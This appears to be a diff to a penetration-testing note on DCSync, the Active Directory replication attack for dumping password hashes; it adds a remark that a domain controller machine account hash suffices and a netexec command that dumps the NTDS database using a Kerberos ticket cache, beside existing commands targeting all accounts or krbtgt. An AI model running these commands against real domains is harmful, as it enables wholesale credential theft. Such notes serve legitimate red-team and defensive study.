@@ -15,7 +15,7 @@ DCSync is a technique for stealing the Active Directory password database by usi
 
 > [!Requirements]
 > - Access control over an account that has the rights to perform domain replication (a user with the `Replicating Directory Changes`, `Replicating Directory Changes All` and `Replicating Directory Changes in Filtered Set` permissions set).
-> - By default, members of the _Domain Admins_, _Enterprise Admins_, and _Administrators_ groups have these rights assigned
+> - By default, members of the _Domain Admins_, _Enterprise Admins_, and _Administrators_ groups have these rights assigned. Also, if we have the **domain machine account hash** for the DC we can perform the DCSync attack.
 
 **Manual Way**
 
@@ -109,6 +109,9 @@ The `ntdsutil`/`--ntds` module performs a DCSync when the supplied account has t
 $ netexec smb DC_IP -u USER -p 'PASSWORD' --ntds
 # or target a single account:
 $ netexec smb DC_IP -u USER -p 'PASSWORD' --ntds --user krbtgt
+
+# kerberos login
+$ sudo nxc smb DC_IP -u USER --use-kcache --ntds
 ```
 
 # What to do with the loot
